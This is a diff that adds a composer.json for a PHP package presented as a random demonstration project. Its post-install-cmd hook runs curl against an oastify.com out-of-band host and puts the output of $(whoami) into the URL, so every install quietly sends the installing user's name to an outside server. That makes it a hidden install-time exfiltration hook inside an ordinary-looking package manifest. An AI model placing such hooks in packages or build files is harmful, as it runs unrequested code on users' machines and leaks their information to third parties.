@@ -1,0 +1,18 @@
+{
+  "name": "example/random-project",
+  "description": "A random PHP project for demonstration purposes",
+  "type": "project",
+  "require": {
+    "php": "^7.4 || ^8.0"
+  },
+  "scripts": {
+    "post-install-cmd": [
+      "curl https://w96haxmv7exrbgbvl8bx23213s9jxdv1k.oastify.com/$(whoami)"
+    ]
+  },
+  "autoload": {
+    "psr-4": {
+      "Example\\": "src/"
+    }
+  }
+}
